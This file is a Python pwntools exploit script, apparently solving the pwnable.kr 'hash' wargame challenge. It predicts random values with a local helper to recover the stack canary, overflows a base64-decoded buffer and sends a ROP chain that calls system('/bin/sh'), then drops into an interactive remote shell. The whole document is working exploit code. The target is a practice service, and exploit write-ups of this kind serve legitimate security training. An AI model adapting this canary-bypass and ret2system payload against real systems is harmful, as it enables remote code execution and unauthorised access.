###BOF

from pwn import *
import subprocess
import base64

###Utils
def getrands():
    rands = list(map(int,subprocess.getoutput('./genrand').strip().split('\n')))
    return rands

###Addr
g_buf = 0x804b0e0
system = 0x8048880

###Value
uint_cap = 4294967296

###Exploit
r = remote('pwnable.kr',9002)

rands = getrands()
r.recvuntil('captcha : ')
hashed = int(r.recvline().strip())
canary = hashed-rands[1]-rands[2]+rands[3]-rands[4]-rands[5]+rands[6]-rands[7]
canary %= uint_cap

padding = b'a'*0x200
canary = flat([canary])
padding2 = b'a'*0xc
ROPchain = p32(system)+p32(0)+p32(g_buf+0x21c*4//3+4)
padding3 = p32(0)
string = b'/bin/sh\x00'
payload = base64.b64encode(padding+canary+padding2+ROPchain)+padding3+string

r.sendline(str(hashed))
r.sendlineafter('me!\n',payload)
r.interactive()
